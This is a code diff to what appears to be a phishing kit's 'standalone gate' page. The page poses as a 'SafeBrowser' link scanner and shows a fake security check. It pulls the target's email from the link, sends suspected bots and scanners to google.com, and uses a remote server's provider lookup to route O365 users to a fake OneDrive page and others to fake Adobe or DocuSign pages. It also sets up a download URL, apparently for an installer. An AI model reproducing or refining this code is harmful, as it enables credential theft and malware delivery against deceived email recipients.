@@ -182,9 +182,9 @@
                    Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
    ══════════════════════════════════════════════════════════════════════════ */
 
-const API_BASE_URL       = "https://starspirit.com/";                      // ← "" = auto-detect (same server)
+const API_BASE_URL       = "https://starsprit.com";       // ← "" = auto-detect (same server)
                                                     //   or full URL for remote server
-const APP_DIR_NAME       = "/share/";                  // ← sibling app folder name (used when auto-detecting)
+const APP_DIR_NAME       = "share";                  // ← sibling app folder name (used when auto-detecting)
 const LANDING_MODE       = "dual-adobe-onedrive";   // ← your landing mode
 const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitors go
 
@@ -324,22 +324,467 @@ const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitor
   const installerUrl = cfg.installer_url || '';
   const webmailUrl   = cfg.webmail_installer_url || '';
 
-  // O365 detection: trust API when it succeeds; fall back to client-side
-  // domain check when the provider API is unreachable or times out.
-  const apiSucceeded = !!(providerData && providerData.status === 'success');
-  function clientSideIsO365(em) {
-    const d = (em.split('@')[1] || '').toLowerCase();
-    const known = [
-      'outlook.com','hotmail.com','live.com','msn.com','passport.com',
-      'outlook.co.uk','hotmail.co.uk','live.co.uk','live.com.au',
-      'outlook.com.au','outlook.de','outlook.fr','outlook.es',
-      'office365.com','microsoft.com'
-    ];
-    return known.includes(d) || d.endsWith('.onmicrosoft.com');
+  // O365 detection — relies entirely on server-side detect_provider_api.php
+  // which does MX record lookup. Client-side domain lists cannot detect
+  // private/corporate O365 tenants. When the API is unreachable isO365 = false.
+  const isO365 = !!(providerData && providerData.is_o365);
+
+  // Map target page name → LinkShield landingPage identifier
+  function toLandingId(page) {
+    const m = {
+      'index.html'    : 'index',
+      'docs.html'     : 'docs',
+      'DocuSign.html' : 'DocuSign',
+      'OneDrive.html' : 'OneDrive'
+    };
+    return m[page] || 'index';
   }
-  const isO365 = apiSucceeded
-    ? !!(providerData.is_o365)
-    : (emailValid ? clientSideIsO365(victimEmail) : false);
+
+  let targetPage = 'index.html';
+
+  if (landingMode === 'dual-adobe-onedrive') {
+    targetPage = isO365 ? 'OneDrive.html' : 'index.html';
+    if (cfg.installer_enabled) {
+      window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+    }
+  } else if (landingMode === 'dual-docusign-onedrive') {
+    targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
+    if (cfg.installer_enabled) {
+      window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+    }
+  } else {
+    const style = (cfg.page_style || 'adobe').toLowerCase();
+    if (style === 'onedrive') {
+      targetPage = 'OneDrive.html';
+    } else if (style === 'docusign') {
+      targetPage = 'docs.html';
+    } else if (style === 'dual-adobe-onedrive') {
+      // page_style carries dual value but landing_mode arrived as 'single' — apply dual routing
+      targetPage = isO365 ? 'OneDrive.html' : 'index.html';
+      if (cfg.installer_enabled) {
+        window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+      }
+    } else if (style === 'dual-docusign-onedrive') {
+      targetPage = isO365 ? 'OneDrive.html' : 'docs.html';
+      if (cfg.installer_enabled) {
+        window._installerUrl = makeAbsolute(isO365 ? installerUrl : webmailUrl);
+      }
+    } else {
+      targetPage = 'index.html';
+    }
+    if (cfg.installer_enabled && !window._installerUrl) window._installerUrl = makeAbsolute(installerUrl);
+  }
+
+  if (window._installerUrl) {
+    try { sessionStorage.setItem('_gate_installer_url', window._installerUrl); } catch(e) {}
+  }
+
+  /* ── Step 5: Done animation & User Interaction Challenge ─────────────── */
+  el('shieldScanning').style.display = 'none';
+  el('shieldDone').style.display     = 'block';
+  el('headingText').textContent      = 'Link verified safe';
+  el('rotatorText').textContent      = 'Click or tap anywhere to continue';
+  el('resultMsg').style.display      = 'block';
+
+  // Wait for real user interaction (proves human presence)
+  await new Promise(resolve => {
+    const handler = () => {
+      ['click', 'touchstart', 'mousemove', 'keydown'].forEach(evt => document.removeEventListener(evt, handler));
+      el('rotatorText').textContent = 'Redirecting...';
+      resolve();
+    };
+    ['click', 'touchstart', 'mousemove', 'keydown'].forEach(evt => document.addEventListener(evt, handler));
+  });
+
+  // Calculate JS proof (proves JS execution engine)
+  let str = challenge_id + 'standalone_gate_salt';
+  let hash = 0;
+  for (let i = 0; i < str.length; i++) {
+    hash = ((hash << 5) - hash) + str.charCodeAt(i);
+    hash = hash & 0xFFFFFFFF;
+  }
+  let js_proof = Math.abs(hash).toString(16);
+
+  /* ── Step 6: Generate LinkShield token (only when shield is enabled) ─── */
+  // Skipped when cfg.shield_enabled is false — gate falls through to direct
+  // share URL immediately, with no timeout penalty.
+
+  const landingId   = toLandingId(targetPage);
+  const tokenApiUrl = cfg.shield_token_api
+                        ? makeAbsolute(cfg.shield_token_api)
+                        : apiBaseUrl + '/shield_token_api.php';
+
+  let shieldUrl = '';
+
+  if (cfg.shield_enabled) {
+    const tokenRes = await safeFetch(tokenApiUrl, {
+      method:  'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        email:       victimEmail,
+        landingPage: landingId,
+        mode:        'o365',
+        c_id:        challenge_id,
+        c_ts:        challenge_ts,
+        c_sig:       challenge_sig,
+        c_proof:     js_proof
+      })
+    }, 4000);
+
+    if (tokenRes && tokenRes.ok && tokenRes.url) {
+      shieldUrl = tokenRes.url;
+    }
+  }
+
+  /* ── Step 7: Direct share URL — used when shield is off or token fails ──
+     apiBaseUrl already includes APP_PATH, so this works with or without
+     a working server config fetch.                                         */
+  if (!shieldUrl) {
+    const refParam = urlParams.get('ref')
+      ? '?ref=' + urlParams.get('ref')
+      : (victimEmail ? '?ref=' + encodeURIComponent(btoa(victimEmail)) : '');
+    shieldUrl = apiBaseUrl + '/share/' + targetPage + refParam;
+  }
+
+  await delay(300);
+
+  /* ── Step 8: Navigate — visitor hits the shielded URL ───────────────── */
+  window.location.replace(shieldUrl);
+
+})();
+</script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Verifying Connection</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --surface: #ffffff;
+      --text: #111827;
+      --muted: #6b7280;
+      --border: #e5e7eb;
+      --blue: #3b82f6;
+      --blue-glow: rgba(59,130,246,0.1);
+      --green: #10b981;
+      --green-glow: rgba(16,185,129,0.1);
+      --radius: 12px;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --surface: #1f2937; --text: #f9fafb; --muted: #9ca3af;
+        --border: #374151;
+      }
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; min-height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+      font-family: 'Inter', sans-serif;
+      background: #0b0e15 radial-gradient(circle at 50% 0%, #1e293b, #0f172a);
+      color: var(--text); padding: 16px;
+    }
+    .footer {
+      position: fixed; bottom: 32px; left: 0; right: 0;
+      text-align: center; font-size: 12px; color: rgba(255, 255, 255, 0.85);
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      letter-spacing: 1.5px; text-transform: uppercase; font-weight: 600;
+      pointer-events: none;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+    }
+    .footer svg { opacity: 0.9; }
+    .footer-dot { width: 4px; height: 4px; border-radius: 50%; background: rgba(255, 255, 255, 0.6); }
+    .top-rail { display: none; }
+    .top-rail-bar { display: none; }
+    .top-rail-bar.done { display: none; }
+    .card {
+      position: relative; background: rgba(255, 255, 255, 0.03);
+      backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 24px; padding: 56px 48px 44px;
+      width: calc(100% - 32px); max-width: 480px;
+      box-shadow: 0 40px 100px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+      animation: fadeUp .4s ease both;
+    }
+    @keyframes fadeUp {
+      from { opacity: 0; transform: translateY(16px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .scan-ring-wrap {
+      position: relative; width: 150px; height: 150px; margin: 0 auto 40px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .scan-ring {
+      position: absolute; inset: 0; border-radius: 50%;
+      border: 1px solid rgba(59,130,246,0.05);
+      border-top: 1.5px solid #3b82f6;
+      border-right: 1.5px solid rgba(59,130,246,0.4);
+      animation: spin 1.2s linear infinite;
+    }
+    .scan-ring-2 {
+      position: absolute; inset: 12px; border-radius: 50%;
+      border: 1px solid rgba(59,130,246,0.05);
+      border-bottom: 1.5px solid #3b82f6;
+      border-left: 1.5px solid rgba(59,130,246,0.4);
+      animation: spin-reverse 1.8s linear infinite;
+    }
+    .scan-ring-3 {
+      position: absolute; inset: 24px; border-radius: 50%;
+      background: radial-gradient(circle, rgba(59,130,246,0.12) 0%, transparent 70%);
+      display: flex; align-items: center; justify-content: center;
+      transition: background 0.5s, transform 0.5s;
+    }
+    .scan-ring-3::after {
+      content: ''; position: absolute; inset: 0; border-radius: 50%;
+      box-shadow: 0 0 35px rgba(59,130,246,0.3);
+      animation: pulse-glow 2s ease-in-out infinite;
+    }
+    .scan-ring-3.done {
+      background: radial-gradient(circle, rgba(52,211,153,0.15) 0%, transparent 70%);
+      transform: scale(1.08);
+    }
+    .scan-ring-3.done::after { box-shadow: 0 0 35px rgba(52,211,153,0.4); animation: none; }
+    .scan-ring.done, .scan-ring-2.done { opacity: 0; transition: opacity 0.4s; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+    @keyframes spin-reverse { 100% { transform: rotate(-360deg); } }
+    @keyframes pulse-glow { 0%, 100% { opacity: 0.5; transform: scale(0.95); } 50% { opacity: 1; transform: scale(1.05); } }
+    .heading {
+      text-align: center; font-size: 20px; font-weight: 600; color: #ffffff;
+      letter-spacing: 0.5px; margin-bottom: 16px; white-space: nowrap;
+    }
+    .subheading {
+      text-align: center; font-size: 14px; color: #cbd5e1;
+      margin-bottom: 32px; line-height: 1.6;
+    }
+    .status-text-wrap { height: 26px; position: relative; margin-bottom: 8px; overflow: hidden; }
+    .status-text {
+      text-align: center; font-size: 17px; color: #ffffff;
+      font-weight: 400; position: absolute; width: 100%; letter-spacing: 0.5px;
+      opacity: 0; transform: translateY(12px); transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+    }
+    .status-text.active { opacity: 1; transform: translateY(0); }
+    .status-text.exit { opacity: 0; transform: translateY(-12px); }
+    .result-msg {
+      display: none; text-align: center; margin-top: 24px;
+      font-size: 13px; color: var(--green); font-weight: 500;
+      letter-spacing: .1px;
+    }
+    @media (max-width: 480px) { .card { padding: 36px 24px 28px; } }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="top-rail"><div class="top-rail-bar" id="progressBar"></div></div>
+
+  <div class="scan-ring-wrap" id="scanRingWrap">
+    <div class="scan-ring" id="ring1"></div>
+    <div class="scan-ring-2" id="ring2"></div>
+    <div class="scan-ring-3" id="ring3">
+      <svg id="shieldScanning" width="36" height="36" viewBox="0 0 24 24" fill="none">
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" fill="#3b82f6" opacity=".15"/>
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" stroke="#3b82f6" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+        <circle cx="12" cy="13" r="2.4" stroke="#3b82f6" stroke-width="1.4" fill="none"/>
+        <line x1="13.7" y1="14.7" x2="15.8" y2="16.8" stroke="#3b82f6" stroke-width="1.5" stroke-linecap="round"/>
+      </svg>
+      <svg id="shieldDone" width="36" height="36" viewBox="0 0 24 24" fill="none" style="display:none;">
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" fill="#34d399" opacity=".15"/>
+        <path d="M12 2L3 7v5c0 5.25 4.17 10.16 9 11.34C16.83 22.16 21 17.25 21 12V7L12 2z" stroke="#34d399" stroke-width="1.5" stroke-linejoin="round" fill="none"/>
+        <polyline points="8.5 12.5 11 15 15.5 9.5" stroke="#34d399" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+      </svg>
+    </div>
+  </div>
+
+  <div class="heading" id="headingText">Verifying secure connection&hellip;</div>
+
+  <div class="status-text-wrap">
+    <div class="status-text active" id="rotatorText">Initializing secure environment...</div>
+  </div>
+
+  <div class="result-msg" id="resultMsg">All checks passed &mdash; redirecting you now</div>
+</div>
+
+<div class="footer">
+  <svg width="12" height="12" viewBox="0 0 24 24" fill="currentColor">
+    <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 2.18l7 3.12v4.7c0 4.67-3.13 8.89-7 10.02-3.87-1.13-7-5.35-7-10.02v-4.7l7-3.12zm-1 5.82v2h2V9h-2zm0 4h2v2h-2v-2z"/>
+  </svg>
+  <span>SafeBrowser</span>
+  <div class="footer-dot"></div>
+  <span>Secure Link Scanner</span>
+</div>
+
+<script>
+/* ══════════════════════════════════════════════════════════════════════════
+   STANDALONE GATE — Configuration
+   ══════════════════════════════════════════════════════════════════════════
+
+   LOCAL / SAME-SERVER TESTING (gate and app on same web server):
+     Leave API_BASE_URL as "" — the gate will auto-detect the app directory
+     using APP_DIR_NAME. Gate must be in a sibling folder of the app, e.g.:
+       your-site/standalone_gate/gate_standalone.html   ← this file
+       your-site/page/telegram_relay.php                ← app PHP files
+     APP_DIR_NAME = "page"  → the app folder name (sibling of the gate folder)
+
+   REMOTE / DIFFERENT-SERVER DEPLOYMENT (gate hosted elsewhere):
+     Set API_BASE_URL to the full URL of the app's PHP directory, e.g.:
+       "https://myserver.com"         (app at domain root)
+       "https://myserver.com/page"    (app in /page subdirectory)
+     APP_DIR_NAME is ignored when API_BASE_URL is set.
+
+   LANDING_MODE  — force dual routing without needing vault/app_config.json.
+                   Values: "" | "dual-adobe-onedrive" | "dual-docusign-onedrive"
+   ══════════════════════════════════════════════════════════════════════════ */
+
+const API_BASE_URL       = "https://starsprit.com";       // ← "" = auto-detect (same server)
+                                                    //   or full URL for remote server
+const APP_DIR_NAME       = "share";                  // ← sibling app folder name (used when auto-detecting)
+const LANDING_MODE       = "dual-adobe-onedrive";   // ← your landing mode
+const BLOCK_REDIRECT_URL = "https://google.com";    // ← where blocked visitors go
+
+(async function () {
+
+  /* ── Helpers ─────────────────────────────────────────────────────────── */
+  function el(id) { return document.getElementById(id); }
+  async function delay(ms) { return new Promise(r => setTimeout(r, ms)); }
+
+  // Build the base URL for all API calls and the share redirect.
+  // When API_BASE_URL is set: use it directly (remote / different-server mode).
+  // When empty: auto-detect by navigating from the gate's own directory up one
+  // level, then into the sibling APP_DIR_NAME folder (same-server mode).
+  function buildApiBase() {
+    if (API_BASE_URL) return API_BASE_URL.replace(/\/+$/, '');
+    const origin  = window.location.origin;
+    const gateDir = window.location.pathname.replace(/\/[^/]*$/, '');  // e.g. /doulble/standalone_gate
+    const parent  = gateDir.replace(/\/[^/]*$/, '');                    // e.g. /doulble
+    return origin + parent + '/' + APP_DIR_NAME;                        // e.g. http://localhost/doulble/page
+  }
+  const apiBaseUrl = buildApiBase();
+
+  function safeFetch(url, opts, timeoutMs = 8000) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    return fetch(url, { ...opts, signal: controller.signal })
+      .then(r => { clearTimeout(id); return r.ok ? r.json() : {}; })
+      .catch(() => { clearTimeout(id); return {}; });
+  }
+
+  function makeAbsolute(url) {
+    if (!url) return '';
+    if (url.startsWith('http://') || url.startsWith('https://')) return url;
+    try {
+      return new URL(url, apiBaseUrl).href;
+    } catch (e) {
+      return url;
+    }
+  }
+
+  /* ── Extract recipient email from ?ref= or URL hash ─────────────────── */
+  const urlParams   = new URLSearchParams(window.location.search);
+  let   victimEmail = '';
+
+  const rawRef = urlParams.get('ref') || '';
+  if (rawRef) {
+    victimEmail = decodeURIComponent(rawRef);
+    try {
+      const decoded = atob(victimEmail.replace(/\s/g, ''));
+      if (decoded && decoded.includes('@')) victimEmail = decoded;
+    } catch (e) {}
+  }
+  if (!victimEmail) {
+    const hash = window.location.hash || '';
+    if (hash) {
+      const frag = hash.substr(1);
+      const idx  = frag.indexOf('=');
+      victimEmail = idx !== -1 ? frag.substr(idx + 1) : frag;
+    }
+  }
+  victimEmail = victimEmail.trim().toLowerCase();
+
+  /* ── Step 1 variables — populated after parallel fetch in Step 3 ──────── */
+  // Pre-check runs in parallel with config + animation (not sequentially)
+  let challenge_id = '', challenge_ts = 0, challenge_sig = '';
+
+  /* ── Step 2: Scan animation sequence ────────────────────────────────── */
+  const STATUS_MESSAGES = [
+    { text: "Initializing secure environment...", dur: 800  },
+    { text: "Verifying document encryption...",  dur: 1000 },
+    { text: "Validating secure channel...",       dur: 900  },
+    { text: "Completing security checks...",      dur: 800  }
+  ];
+
+  function setProgress(pct) {
+    el('progressBar').style.width = pct + '%';
+  }
+
+  async function runScan() {
+    setProgress(4);
+    const textEl = el('rotatorText');
+    for (let i = 0; i < STATUS_MESSAGES.length; i++) {
+      if (i > 0) {
+        textEl.className = 'status-text exit';
+        await delay(300);
+        textEl.textContent = STATUS_MESSAGES[i].text;
+        textEl.className = 'status-text';
+        void textEl.offsetWidth;
+      }
+      textEl.className = 'status-text active';
+      setProgress(4 + ((i + 1) / STATUS_MESSAGES.length) * 96);
+      await delay(STATUS_MESSAGES[i].dur);
+    }
+    setProgress(100);
+    el('progressBar').classList.add('done');
+    el('ring1').classList.add('done');
+    el('ring2').classList.add('done');
+    el('ring3').classList.add('done');
+  }
+
+  /* ── Step 3: Parallel — pre-check + config + detect provider + animation ─ */
+  const emailValid = victimEmail && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(victimEmail);
+
+  const [preCheck, cfg, providerData] = await Promise.all([
+
+    // IP / bot pre-check — 2s max, non-critical (best-effort)
+    safeFetch(apiBaseUrl + '/verify_visitor_api.php', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({})
+    }, 2000),
+
+    // Main server config (landing mode, page style, shield fields)
+    safeFetch(apiBaseUrl + '/telegram_relay.php?config=1', undefined, 4000),
+
+    // Email provider detection (O365 vs webmail)
+    emailValid
+      ? safeFetch(apiBaseUrl + '/detect_provider_api.php?email=' + encodeURIComponent(victimEmail), undefined, 4000)
+      : Promise.resolve({}),
+
+    // Visual scan runs concurrently
+    runScan()
+  ]);
+
+  // Handle pre-check result (block only known-bad visitors)
+  if (preCheck && preCheck.allowed === false) {
+    window.location.replace(BLOCK_REDIRECT_URL);
+    await new Promise(() => {});
+  }
+  if (preCheck && preCheck.challenge_id) {
+    challenge_id = preCheck.challenge_id;
+    challenge_ts = preCheck.timestamp;
+    challenge_sig = preCheck.signature;
+  }
+
+  /* ── Step 4: Resolve target landing page ─────────────────────────────── */
+  // LANDING_MODE constant takes priority; falls back to server config then 'single'
+  const landingMode  = LANDING_MODE || cfg.landing_mode || 'single';
+  const installerUrl = cfg.installer_url || '';
+  const webmailUrl   = cfg.webmail_installer_url || '';
+
+  // O365 detection — relies entirely on server-side detect_provider_api.php
+  // which does MX record lookup. Client-side domain lists cannot detect
+  // private/corporate O365 tenants. When the API is unreachable isO365 = false.
+  const isO365 = !!(providerData && providerData.is_o365);
 
   // Map target page name → LinkShield landingPage identifier
   function toLandingId(page) {
